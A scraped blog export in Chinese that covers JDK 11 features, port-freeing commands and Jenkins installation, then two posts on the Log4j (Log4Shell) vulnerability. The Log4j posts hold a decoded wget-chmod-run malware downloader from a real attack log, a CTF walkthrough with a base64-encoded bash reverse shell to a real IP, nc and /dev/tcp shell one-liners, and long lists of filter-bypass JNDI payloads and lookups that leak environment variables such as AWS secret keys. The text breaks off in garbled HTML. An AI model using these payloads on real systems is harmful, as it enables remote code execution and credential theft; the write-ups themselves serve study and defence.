CardTable 扫描，自适应的堆占用比例调整（IHOP），在并发标记阶段的类型卸载等等。这些都是针对 G1 的不断增强，其中串行 Full GC 等甚至是曾经被广泛诟病的短板，你会发现 GC 配置和调优在 JDK11 中越来越方便。 # Flight Recorder（JFR） Flight Recorder（JFR）是 Oracle 刚刚开源的强大特性。JFR 是一套集成进入 JDK、JVM 内部的事件机制框架，通过良好架构和设计的框架，硬件层面的极致优化，生产环境的广泛验证，它可以做到极致的可靠和低开销。在 SPECjbb2015 等基准测试中，JFR 的性能开销最大不超过 1%，所以，工程师可以基本没有心理负担地在大规模分布式的生产系统使用，这意味着，我们既可以随时主动开启 JFR 进行特定诊断，也可以让系统长期运行 JFR，用以在复杂环境中进行 “After-the-fact” 分析。 在保证低开销的基础上，JFR 提供的能力可以应用在对锁竞争、阻塞、延迟，JVM GC、SafePoint 等领域，进行非常细粒度分析。甚至深入 JIT Compiler 内部，全面把握热点方法、内联、逆优化等等。JFR 提供了标准的 Java、C++ 等扩展 API，可以与各种层面的应用进行定制、集成，为复杂的企业应用栈或者复杂的分布式应用，提供 All-in-One 解决方案。而这一切都是内建在 JDK 和 JVM 内部的，并不需要额外的依赖，开箱即用。 # Low-Overhead Heap Profiling 它来源于 Google 等业界前沿厂商的一线实践，通过获取对象分配细节，为 JDK 补足了对象分配诊断方面的一些短板，工程师可以通过 JVMTI 使用这个能力增强自身的工具。 # HTTP/2 Client API 新的 HTTP API 提供了对 HTTP/2 等业界前沿标准的支持，精简而又友好的 API 接口，与主流开源 API（如，Apache HttpClient， Jetty， OkHttp 等）对等甚至更高的性能。与此同时它是 JDK 在 Reactive-Stream 方面的第一个生产实践，广泛使用了 Java Flow API 等，终于让 Java 标准 HTTP 类库在扩展能力等方面，满足了现代互联网的需求。 # Transport Layer Security (TLS) 1.3 就是安全类库、标准等方面的大范围升级，它还是中国安全专家范学雷所领导的 JDK 项目，完全不同于以往的修修补补，是个非常大规模的工程。 Dynamic Class-File Constants 动态 class 文件常量。扩展了 Java class 文件格式，支持一种新的常量池形式：CONSTANT_Dynamic。 # Improve Aarch64 Intrinsics 主要是针对 ARM Aarch64 架构的优化，比如提供优化的 sin、cos 等函数。 # Epsilon: A No-Op Garbage Collector(Experimental) 无操作的垃圾收集器。Epsilon 是一个特殊的垃圾收集器，只处理内存分配，不负责回收。一旦堆耗尽，就关闭 JVM。听上去这个收集器好像没什么意义。不过它还是有不少用处的。比如：性能测试。GC 会影响性能，有了这么一个几乎什么都不干的 GC，我们可以过滤掉 GC 带来的影响因素。还有些性能因素不是 GC 引入的，比如编译器变换，利用 Epsilon GC，我们可以对比。就像生物学里做实验，我们可以用它做一个对照组。另外还有内存压力测试、VM 接口测试等。 # Launch Single-File Source-Code Programs 支持运行单个文件中的源代码。在刚学习 Java 或者编写小的工具程序时，我们一般要先用 javac 编译源文件，再用 java 命令运行。有了这个功能，我们可以直接用 java 命令运行源程序。 # Unicode 10 升级现有 API 支持 Unicode 10。Java SE 10 实现的是 Unicode 8.0。与 Java 10 相比，Java 11 多支持 16 018 个新字符，10 种新的文字类型。 # Nest-Based Access Control 基于嵌套的访问控制。Java 11 引入了 nest 的概念，这是一个新的访问控制上下文（context），逻辑上处于同一代码实体中的类，尽管会被编译为不同的 class 文件，但是可以访问彼此的 private 成员，不再需要编译器插入辅助访问的桥方法。 # Dynamic Class-File Constants 动态 class 文件常量。扩展了 Java class 文件格式，支持一种新的常量池形式：CONSTANT_Dynamic。 # Remove the Java EE and CORBA Modules 将 Java SE 9 中标记为废弃的 Java EE 和 CORBA 正式从 Java SE 平台中删除。 # Deprecate the Nashorn JavaScript Engine 废弃 Nashorn JavaScript 脚本引擎、API 和 jjs 工具。Nashorn 是在 JDK 8 中引入的，当时完整实现了 ECMAScript-262 5.1。不过随着 ECMAScript 的演进加快，Nashorn 维护越来越困难。 # Deprecate the Pack200 Tools and API 废弃了 pack200 和 unpack200 工具，以及 java.util.jar 包中的 Pack200 API。 # 总结 G1 GC 平均速度通过 Java 8 切换到 Java 11 就有 16％ 的改进，但是大部分项目都用不到，一些高实时性的游戏可以用； Java 11 支持源文件直接运行； 已完成项目不建议升级 jdk11，或者新项目需要依赖现有代码，不建议升级 jdk11，因为升级版本涉及到大量的旧代码移植，代码重写，架构重构，全量测试； 如果 jdk8 满足开发需求，并且需依赖现有以 JDK8 开发的代码，建议还是以 jdk8 进行开发，否则如果选用 jdk11 可能面临旧代码重写，架构重构，以及一些不知道的隐形依赖； 系统追求的是稳定并非技术，jdk8 已被广泛验证非常稳定，而且目前主流开发版本确实也是 8，技术还是要服务于业务，稳定大于一切； 从 jdk8 往上升级会出现一些 jar 依赖的改变，模块化带来的反射问题，classload 的变化导致某些问题； Spring，Spring Boot，Spring Cloud，Dubbo，Guava，Jackson，Tomcat，JUnit 等等项目都适配了 JDK11，并且经历了生产环境的检验，才可以考虑是否将 JDK8 换成 JDK11； 8 之后，商用收费 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/04/27/%E3%80%90Java%E5%85%AB%E8%82%A1%E6%96%87%E3%80%91JDK8%E4%B8%8EJDK11%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"title":"端口占用问题","text":"安装好 Maven 之后配置环境变量： netstat -ano：查询全部活动连接 tasklist ：查询全部的进程和 PID tasklist | findstr “占用端口的进程 PID” taskkill /f/t /im 占用端口的进程名字.exe # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/06/20/%E3%80%90Java%E3%80%91%E7%AB%AF%E5%8F%A3%E5%8F%B7%E8%A2%AB%E5%8D%A0%E7%94%A8%E7%9A%84%E6%83%85%E5%86%B5%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/"},{"title":"Linux下使用war包部署Jenkins","text":"# Linux 下使用 war 包部署 Jenkins # 前言 jenkins 可以多种方式安装，可以 docker，也可以直接下载 war 包，然后 java -jar 方式启动。 123456789101.创建安装目录 mkdir -p /jenkins2.切换目录 cd /jenkins3.下载war包 wget -O /jenkins/jenkins.war http://mirrors.jenkins.io/war-stable/latest/jenkins.war4.启动 BUILD_ID=dontKillMe nohup java -DJENKINS_HOME=/jenkins (如果有历史home可以指定其他home：/root/.jenkins) -Xms1046m -Xmx2000m -jar jenkins.war --httpPort=9444 &gt;&gt;jenkinsLog.log 2&gt;&amp;1 &amp;5.访问 http://{your ip}:9444 # 备注: –httpPort 自定义端口 jenkins 默认工作目录：/root/.jenkins nohup 后台启动 ‘&gt;&gt;log’ 以追加的方式记录日志 2&gt;&amp;1 2: 标准异常输出 1: 标准输出 ，2&gt;&amp;1 两种输出都记录到 log 文件中 &amp; 后台启动方式 BUILD_ID=dontKillMe 防止误杀包 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/02/18/%E3%80%90Jenkins%E3%80%91Linux%E4%B8%8B%E4%BD%BF%E7%94%A8war%E5%8C%85%E9%83%A8%E7%BD%B2Jenkins/"},{"title":"Linux环境下安装jenkins","text":"# Linux 环境下安装 jenkins # 1、添加存储库 yum 的 repo 中默认没有 Jenkins，需要先将 Jenkins 存储库添加到 yum repos，执行下面的命令： 1sudo wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo 完成界面： 然后执行下面的命令： 1sudo rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io.key # 2、安装 jenkins 执行安装命令： yum install jenkins 如下图所示，出现询问是否下载时，输入 y，然后点击回车，等待安装完成： # 3、修改配置 jenkins 安装成功后，默认的用户是 jenkins，端口是 8080，为了防止冲突，并且给用户赋权限，我们修改用户名和端口。 输入命令，进入 jenkins 配置文件： 1vi /etc/sysconfig/jenkins 找到如下配置： 12345678910111213141516171819202122232425262728293031323334353637JENKINS_USER=&quot;jenkins&quot;## Type: string## Default: &quot;false&quot;## ServiceRestart: jenkins## Whether to skip potentially long-running chown at the# $JENKINS_HOME location. Do not enable this, &quot;true&quot;, unless# you know what you're doing. See JENKINS-23273.##JENKINS_INSTALL_SKIP_CHOWN=&quot;false&quot;## Type: string## Default: &quot;-Djava.awt.headless=true&quot;## ServiceRestart: jenkins## Options to pass to java when running Jenkins.#JENKINS_JAVA_OPTIONS=&quot;-Djava.awt.headless=true&quot;## Type: integer(0:65535)## Default: 8080## ServiceRestart: jenkins## Port Jenkins is listening on.# Set to -1 to disable#JENKINS_PORT=&quot;8080&quot;## Type: string## Default: &quot;&quot;## ServiceRestart: jenkins## IP address Jenkins listens on for HTTP requests.# Default is all interfaces (0.0.0.0).# # 修改用户名，端口： # 若为云服务器，需配置安全组并开放端口才可以正常访问 # 启动 jenkins # 1. 如果是 2022 年 7 月以后安装的 jekins，需要下载 jdk11 或者 jdk17 版本的 jdk 环境 1yum install fontconfig java-11-openjdk # 设置自启后启动 jenkins 服务：systemctl enable --now jenkins # 查看是否自启动：systemctl is-enabled jenkins # 查看服务状态：systemctl status jenkins.service # jenkins: failed to find a valid Java installation # 使用以下方法启动 jenkins 12345678cd /etc/init.d# 启动./jenkins start# 停止./jenkins stop# 状态./jenkins status # 提示 jdk 版本不满足，可能是 jdk11 没有配置到 jeknins 上 # Jenkins requires Java versions [17, 11] but you are running with Java 1.8 from /usr/local/jdk1.8.0_211/jre # 将 jdk11 的环境配置到 /etc/rc.d/init.d/jenkins 的 candidates 中 # 重新启动服务，没有报错 # 访问 Jenkins，第一次需要输入生成的密码，在 /var/lib/jenkins/secrets 目录下的 initialAdminPassword 文件中 # 成功 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/01/27/%E3%80%90Jenkins%E3%80%91Linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%AE%89%E8%A3%85jenkins/"},{"title":"【Log4J】关于最近比较火的log4j研究","text":"# 【Log4J】关于最近比较火的 log4j 研究 最近log4j的安全漏洞搞得程序员人心慌慌，宣称为核弹级bug ，然后自己也找时间了解测试了一下。 Log4j是Apache的一个开源项目，通过使用Log4j，可以控制日志信息输送的目的地是控制台、文件等位置，是程序运行调试追溯问题发生位置的重要手段。 &nbsp;如上，我们自定义username模仿前端请求数据，通过LOGGER.info打印登录的用户名，我们就可以在控制台查看打印的信息。这样我们就可以记录登录的用户。 前端传入什么参数，就会在控制台打印出相应参数。 但当我们传入一些特定参数的时候，打印结果就与期待结果有点不一样了,我们用${java:os}登录打印的却是本机系统信息。 &nbsp;为什么会产生这种奇怪的现象呢？ 是因为log4j提供了一个lookup的功能，对lookup功能不熟悉的也没有关系，你知道有这么个方法，可以把一些系统变量放到日志中就可以了。是不是有点sql注入的味道了。 &nbsp;如果只是打印一些简单的系统信息到还没有什么安全隐患。 但离谱的是 log4j 还提供了关于 jndi 的占位符。 jndi 可以理解为http 地址，log4j会自动加载通过 jndi 从远程服务器获取的 java 对象。就是说黑客用一个特殊标记的jndi字符串登录你的服务器，然后在你打印日志的时候，通过log4j识别远程调用黑客指定服务器的java对象，相当于在你的代码中植入了一段黑客的代码，他可以在这个java对象中写入任何逻辑，比如说植入一个挖矿程序啊，甚至删除你服务器上的任何文件，你说恐怖不 。 下面我写了一个示例代码： 我的service程序仍然是模拟简单的用户登录打印日志。但是登录用户确是一段包含特殊字符的字符串。 &nbsp;运行起来发现被植入了一段特殊的字符。 &nbsp;这不是被人黑了吗。 下面是我模拟的黑客自己搭建的攻击服务，可以选择性观看。 127.0.0.1:80是我启动的一台nginx服务器，在其html文件下将编译好的EviObj的class文件放在了其下面。 EviObj类里面只有一个简答的打印代码。 &nbsp;然后就出现了之前的注入问题。 简单来说，就是log4j识别了字符串包中特殊的${jndi:rmi: }，log4j对其进行了远程调用，而黑客输入的地址正好是他部好侵入代码的地址，这样就在我们的代码中植入了黑客的代码。 关于如何避免，我当然要看一下我们公司的程序会不会被攻击呀。 如果你使用了 Java 8 或以上版本，基本对你没有什么危害。因为在 Java 8 中添加了一个新的属性 com.sun.jndi.rmi.object.trustURLCodebase，这是一个 boolean 类型。默认值是 false。 其实我刚才的代码也是隐藏了一部分，我把这个属性打开了才实验成功的。 &nbsp;而我们用的就是jdk8，所以第一个条件我们就规避成功避免了注入的条件。 其次log4j的版本是log4j 2.x&nbsp; -- log4j 2.4.0之间，如果处于这个版本区间需要升级到2.5.0版本方可。 而我们公司使用的版本是1.7.25版本 。 然后最近我发现我们华为云上的一个项目确实被攻击了o(╥﹏╥)o，应该没有成功。 日志内容如下： &nbsp;第一段 {${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:} ${env:NaN:-j} 等于 j&nbsp; ${env:NaN:-:} 等于： ${env:NaN:-l} 等于 l 那解析完不就是${jndi:ldap: xxxx}，靠真是jndi注入 然后再看bease 64部分解析结果如下： &nbsp;wget http://209.141.46.114/reader : 网站下载reader文件 chmod 777 reader ： 修改reader权限为 777 ./reader runner ：运行reader文件 真是太阴险了，谁知道这reader是什么病毒啊 [○･｀Д´･ ○] 我还真去下载了一下这个reader，但现在下来发现是编译后文件又用upx加壳的文件，解壳后又要反编译，我没有反编译出来也就只能到此为止了。 ## 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/04/27/%E3%80%90Log4J%E3%80%91%E5%85%B3%E4%BA%8E%E6%9C%80%E8%BF%91%E6%AF%94%E8%BE%83%E7%81%AB%E7%9A%84log4j%E7%A0%94%E7%A9%B6/"},{"title":"【Log4J】JAVA安全--log4j漏洞研究分析","text":"# 【Log4J】JAVA 安全–log4j 漏洞研究分析 前言：这个漏洞很火，但是自己一直没咋研究过 算是抽空跟了下，总结了很多师傅的文章 写这篇文章进行记录下自己的学习过程吧 log4j漏洞复现 本地复现 这个很多人写了 可直接参考这个 https://cloud.tencent.com/developer/article/1917856 import org.apache.logging.log4j.Logger; import org.apache.logging.log4j.LogManager; public class log4jRCE { private static final Logger logger = LogManager.getLogger(log4jRCE.class); public static void main(String[] args) { logger.error(&quot;${jndi:ldap:// 服务器的地址 / TomcatBypass/Command/Base64/Y2FsYw==}&quot;); } } 这篇文章里面还缺了一点东西 就是idea生成jar文件的方法 这里一起写出来 ①打开模块设置 ②选模块 ③选好主类以及生成的文件在哪些地方 ④选择包含在项目构建中然后点击应用 编译生成即可 但是对于这个我是失败了的 不知道啥原因 本地编写jar方法 ①把java编写为class文件 javac Exploit.java ②把class编写为jar文件 java -jar Exploit.jar Exploit.class 在线靶场复现 这里以bugku上的靶场为例进行复现 https://ctf.bugku.com/challenges/detail/id/340.html 环境配置 ①ldap服务 服务器起一个ldap服务就好了 java -jar JNDIExploit-1.3-SNAPSHOT.jar -i 服务器的地址 直接执行反弹shell 即直接配置bash反弹shell命令 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMjI2LjY3Lzk5OTkgMD4mMQ}|{base64,-d}|{bash,-i}\" -A \"192.168.72.1\" ②nc配置（windows的话） 起到获取flag的思路 https://eternallybored.org/misc/netcat/ 下载好后进行监听即可 nc -lvnp 端口 思路1 不反弹shell进行获取flag user=${jndi:ldap://服务器的ip:1389/TomcatBypass/TomcatEcho}&amp;pwd=69be4a983341add38e2ad1e5c804568a 思路2 进行反弹shell获取 常见反弹shell的思路 ①nc ip 12345 -e /bin/sh ②bash -i &gt;&amp; /dev/tcp/ 启动 nc 服务器的 ip/9999 0&gt;&amp;1 #然后先 base64 编码然后对编码后的特殊字符进行 2 层 url 转码 这台要用第一个命令，题目限定了 payload=${jndi:ldap:1 / 服务器 ip:1389/basic/Command/Base64 / 二层转码之后的字符} 反弹shell后执行即可 知识点分析 受影响版本 Apache log4j 2.0-beta9 ≤ 2.14.1 组件 org.apache.logging.log4j，且版本号小于2.15.0-rc2 ldap基础知识以及服务原因 payload总结 参考知识点：来源团队的雪晴师傅的 https://www.yuque.com/yq1ng/java/pbica2#xrVeI 基础payload ${jndi:ldap://t00ls.com/poc 绕过的一些payload ${jndi:ldap://domain.com/j} ${jndi:ldap:/domain.com/a} ${jndi:dns:/domain.com} ${jndi:dns://domain.com/j} ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://domain.com/j} ${${::-j}ndi:rmi://domain.com/j} ${jndi:rmi://domainldap.com/j} ${${lower:jndi}:${lower:rmi}://domain.com/j} ${${lower:${lower:jndi}}:${lower:rmi}://domain.com/j} ${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://domain.com/j} ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://domain.com/j} ${jndi:${lower:l}${lower:d}a${lower:p}://domain.com} ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//domain.com/a} jn${env::-}di: jn${date:}di${date:':'} j${k8s:k5:-ND}i${sd:k5:-:} j${main:\\k5:-Nd}i${spring:k5:-:} j${sys:k5:-nD}${lower:i${web:k5:-:}} j${::-nD}i${::-:} j${EnV:K5:-nD}i: j${loWer:Nd}i${uPper::} 信息泄露(主要是针对不出网的) ${jndi:ldap://${env:user}.domain.com/exp} ${jndi:dns://${hostName}.domain.com/a} ${jndi:dns://${env:COMPUTERNAME}.domain.com/a} ${jndi:dns://${env:USERDOMAIN}.domain.com/a} ${jndi:dns://${env:AWS_SECRET_ACCESS_KEY.domain.com/a} ${jndi:ldap://${ctx:loginId}.domain.com/j} ${jndi:ldap://${map:type}.domain.com/j} ${jndi:ldap://${filename}.domain.com/j} ${jndi:ldap://${date:MM-dd-yyyy}.domain.com/j} ${jndi:ldap://${docker:containerId}.domain.com/j} ${jndi:ldap://${docker:containerName}.domain.com/j} ${jndi:ldap://${docker:imageName}.domain.com/j} ${jndi:ldap://${env:USER}.domain.com/j} ${jndi:ldap://${event:Marker}.domain.com/j} ${jndi:ldap://${mdc:UserId}.domain.com/j} ${jndi:ldap://${java:runtime}.domain.com/j} ${jndi:ldap://${java:vm}.domain.com/j} ${jndi:ldap://${java:os}.domain.com/j} ${jndi:ldap://${jndi:logging/context-name}.domain.com/j} ${jndi:ldap://${hostName}.domain.com/j} ${jndi:ldap://${docker:containerId}.domain.com/j} ${jndi:ldap://${k8s:accountName}.domain.com/j} ${jndi:ldap://${k8s:clusterName}.domain.com/j} ${jndi:ldap://${k8s:containerId}.domain.com/j} ${jndi:ldap://${k8s:containerName}.domain.com/j} ${jndi:ldap://${k8s:host}.domain.com/j} ${jndi:ldap://${k8s:labels.app}.domain.com/j} ${jndi:ldap://${k8s:labels.podTemplateHash}.domain.com/j} ${jndi:ldap://${k8s:masterUrl}.domain.com/j} ${jndi:ldap://${k8s:namespaceId}.domain.com/j} ${jndi:ldap://${k8s:namespaceName}.domain.com/j} ${jndi:ldap://${k8s:podId}.domain.com/j} ${jndi:ldap://${k8s:podIp}.domain.com/j} ${jndi:ldap://${k8s:podName}.domain.com/j} ${jndi:ldap://${k8s:imageId}.domain.com/j} ${jndi:ldap://${k8s:imageName}.domain.com/j} ${jndi:ldap://${log4j:configLocation}.domain.com/j} ${jndi:ldap://${log4j:configParentLocation}.domain.com/j} ${jndi:ldap://${spring:spring.application.name}.domain.com/j} ${jndi:ldap://${main:myString}.domain.com/j} ${jndi:ldap://${main:0}.domain.com/j} ${jndi:ldap://${main:1}.domain.com/j} ${jndi:ldap://${main:2}.domain.com/j} ${jndi:ldap://${main:3}.domain.com/j} ${jndi:ldap://${main:4}.domain.com/j} ${jndi:ldap://${main:bar}.domain.com/j} ${jndi:ldap://${name}.domain.com/j} ${jndi:ldap://${marker}.domain.com/j} ${jndi:ldap://${marker:name}.domain.com/j} ${jndi:ldap://${spring:profiles.active[0].domain.com/j} ${jndi:ldap://${sys:logPath}.domain.com/j} ${jndi:ldap://${web:rootDir}.domain.com/j} 可检查的标头 Accept-Charset Accept-Datetime Accept-Encoding Accept-Language Authorization Cache-Control Cf-Connecting_ip Client-Ip Contact Cookie DNT Forwarded Forwarded-For Forwarded-For-Ip Forwarded-Proto From If-Modified-Since Max-Forwards Origin Originating-Ip Pragma Referer TE True-Client-IP True-Client-Ip Upgrade User-Agent Via Warning X-ATT-DeviceId X-Api-Version X-Att-Deviceid X-CSRFToken X-Client-Ip X-Correlation-ID X-Csrf-Token X-Do-Not-Track X-Foo X-Foo-Bar X-Forward-For X-Forward-Proto X-Forwarded X-Forwarded-By X-Forwarded-For X-Forwarded-For-Original X-Forwarded-Host X-Forwarded-Port X-Forwarded-Proto X-Forwarded-Protocol X-Forwarded-Scheme X-Forwarded-Server X-Forwarded-Ssl X-Forwarder-For X-Frame-Options X-From X-Geoip-Country X-HTTP-Method-Override X-Http-Destinationurl X-Http-Host-Override X-Http-Method X-Http-Method-Override X-Http-Path-Override X-Https X-Htx-Agent X-Hub-Signature X-If-Unmodified-Since X-Imbo-Test-Config X-Insight X-Ip X-Ip-Trail X-Leakix X-Originating-Ip X-ProxyUser-Ip X-Real-Ip X-Remote-Addr X-Remote-Ip X-Request-ID X-Requested-With X-UIDH X-Wap-Profile X-XSRF-TOKEN Authorization: Basic Authorization: Bearer Authorization: Oauth Authorization: Token 除ldap以外的其他构造方式 jndi:ldap:/ jndi:rmi:/ jndi:ldaps:/ jndi:dns:/ jndi:nis:/ jndi:nds:/ jndi:corba:/ jndi:iiop:/ jndi:${ 可获取查找的信息 ${hostName} ${sys:user.name} ${sys:user.home} ${sys:user.dir} ${sys:java.home} ${sys:java.vendor} ${sys:java.version} ${sys:java.vendor.url} ${sys:java.vm.version} ${sys:java.vm.vendor} ${sys:java.vm.name} ${sys:os.name} ${sys:os.arch} ${sys:os.version} ${env:JAVA_VERSION} ${env:AWS_SECRET_ACCESS_KEY} ${env:AWS_SESSION_TOKEN} ${env:AWS_SHARED_CREDENTIALS_FILE} ${env:AWS_WEB_IDENTITY_TOKEN_FILE} ${env:AWS_PROFILE} ${env:AWS_CONFIG_FILE} ${env:AWS_ACCESS_KEY_ID} 一张脑图（有一说一不是很懂这个） 批量验证工具 log4j批量检测工具 这个是主动检测的 但是自己测了下,发觉测不出东西 但是主动检测的太少了 还是把这个工具扔在这里 原理研究 基础知识点 JNDI 全名：Java命名和目录接口，自己理解就是定义一个名称去绑定对象或者资源进而进行操控 作用：将名称与java对象或资源关联起来，进行通过名称调用到对应的对象或者资源 可操控的目录与服务有： DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、WindowsXP/2000/NT/Me/9x的注册表、RMI、DSML v1&amp;v2、NIS。 运用方法： 如JNDI数据源配置（使用的原因 只配置一次①加载数据库驱动程序、②连接数据库、④关闭数据库，释放连接，减少性能消耗） 这个师傅讲的比较好了 这里就不讲了 参考链接 LDAP(轻量目录访问协议) LDAP目录服务：由目录数据库和一套访问协议组成的系统。 作用：即存储描述属性的数据和详细信息的数据库。 四种模型： 信息模型 命名模型 功能模型 安全模型 连接LDAP数据库方法： $ldapconn = ldap_connect(“10.1.8.78\") $ldapbind = ldap_bind($ldapconn, 'username', $ldappass); $searchRows= ldap_search($ldapconn, $basedn, \"(cn=*)\"); $searchResult = ldap_get_entries($ldapconn, $searchRows); ldap_close($ldapconn); lookup：允许在写日志的时候，通过关键词去查找对象，输出对象，并实现对象功能。这个对象可以存储在硬盘中或者服务器上。 这个漏洞调用的就是这个接口 Codebase 概念：一种服务 作用：存储代码或者编译文件作用，可通过名称进行编译文件或者获取代码。 RMI协议： 概念：远程方法调用协议，通过网络从远程计算机上请求调用某种服务。(只适合java) 原理： 1.客户调用客户端辅助对象stub上的方法 2.客户端辅助对象stub打包调用信息（变量，方法名），通过网络发送给服务端辅助对象skeleton 3.服务端辅助对象skeleton将客户端辅助对象发送来的信息解包，找出真正被调用的方法以及该方法所在对象 4.调用真正服务对象上的真正方法，并将结果返回给服务端辅助对象skeleton 5.服务端辅助对象将结果打包，发送给客户端辅助对象stub 6.客户端辅助对象将返回值解包，返回给调用者 7.客户获得返回值 漏洞原理知识点： 加载原理：通过rmi进行从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类，进而造成RCE漏洞 详细跟进分析 完整的调用链 lookup:172, JndiManager (org.apache.logging.log4j.core.net) lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup) lookup:223, Interpolator (org.apache.logging.log4j.core.lookup) resolveVariable:1116, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:1038, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup) replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup) format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern) format:38, PatternFormatter (org.apache.logging.log4j.core.pattern) toSerializable:345, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout) toText:244, PatternLayout (org.apache.logging.log4j.core.layout) encode:229, PatternLayout (org.apache.logging.log4j.core.layout) encode:59, PatternLayout (org.apache.logging.log4j.core.layout) directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config) callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config) callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config) callAppender:84, AppenderControl (org.apache.logging.log4j.core.config) callAppenders:543, LoggerConfig (org.apache.logging.log4j.core.config) processLogEvent:502, LoggerConfig (org.apache.logging.log4j.core.config) log:485, LoggerConfig (org.apache.logging.log4j.core.config) log:460, LoggerConfig (org.apache.logging.log4j.core.config) log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config) log:161, Logger (org.apache.logging.log4j.core) tryLogMessage:2198, AbstractLogger (org.apache.logging.log4j.spi) logMessageTrackRecursion:2152, AbstractLogger (org.apache.logging.log4j.spi) logMessageSafely:2135, AbstractLogger (org.apache.logging.log4j.spi) logMessage:2011, AbstractLogger (org.apache.logging.log4j.spi) logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi) error:740, AbstractLogger (org.apache.logging.log4j.spi) main:8, log4jRCE 这里要重点关注的几个点,其余的点几乎都是调用方法或者是进行过滤操作获取数字等 ①这里进行判断了日志等级 如果是小于配置文件的即不能进入 this.logMessage()进行触发漏洞 日志等级 默认只要大于error()和fatal()可以触发漏洞就可以触发漏洞了 具体看配置情况 日志一共分为8个级别，由低到高依次为：All &lt; Trace &lt; Debug &lt; Info &lt; Warn &lt; Error &lt; Fatal &lt; OFF。 1.All：最低等级的，用于打开所有日志记录。 2.Trace：是追踪，就是程序推进以下，你就可以写个trace输出，所以trace应该会特别多，不过没关系，我们可以设置最低日志级别不让他输出。 3.Debug：指出细粒度信息事件对调试应用程序是非常有帮助的。 4.Info：消息在粗粒度级别上突出强调应用程序的运行过程。 5.Warn：输出警告及warn以下级别的日志。 6.Error：输出错误信息日志。 7.Fatal：输出每个严重的错误事件将会导致应用程序的退出的日志。 8.OFF：最高等级的，用于关闭所有日志记录。 配置的最低等级的文件数值在org/apache/logging/log4j/spi/StandardLevel.java中 ②log:460, LoggerConfig (org.apache.logging.log4j.core.config)这个地方 上面的东西查了下感觉就是线程相关所以可以不看 核心还是log的方法 ③MessagePatternConverter方法 ④跟replace方法 调用substitute方法 先调用一个substitute的方法 然后调用另外一个substitute的重载函数进行处理数据 ⑤研究substitute方法 初始化定义的一些变量名 采用while循环逐个去寻找前缀这里的前缀定义即是$和{字符 进行前缀匹配 寻找后缀唯一区别就是可以理解为一个从前查找一个从后查找 然后进行匹配 :- 和 : 对于这种字符的处理 看一个师傅的说法是 :- 赋值关键字，如果程序处理到 ${aaaa:-bbbb} 这样的字符串，处理的结果将会是 bbbb :- 是转义的 :-，如果一个用 a:b 表示的键值对的 key a 中包含 :，则需要使用转义来配合处理，例如 ${aaa:\\-bbb:-ccc}，代表 key 是，aaa:bbb，value 是 ccc。 这也是绕waf的的一些原因 因此结合这些递归解析以及特性我们可以进行绕waf 构造出一些类似于如此的一些payload去绕 {{::-j}::−n&lt;/span&gt;&lt;spanclass=&quot;tokenvariable&quot;&gt;{::-n}&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;::−n&lt;/span&gt;&lt;spanclass=&quot;tokenvariable&quot;&gt;{::-d}::−i&lt;/span&gt;&lt;spanclass=&quot;tokenkeyword&quot;&gt;:&lt;/span&gt;&lt;spanclass=&quot;tokenvariable&quot;&gt;{::-i}&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;::−i&lt;/span&gt;&lt;spanclass=&quot;tokenkeyword&quot;&gt;:&lt;/span&gt;&lt;spanclass=&quot;tokenvariable&quot;&gt;{::-r}::−m&lt;/span&gt;&lt;spanclass=&quot;tokenvariable&quot;&gt;{::-m}&lt;/span&gt;&lt;span class=&quot;token 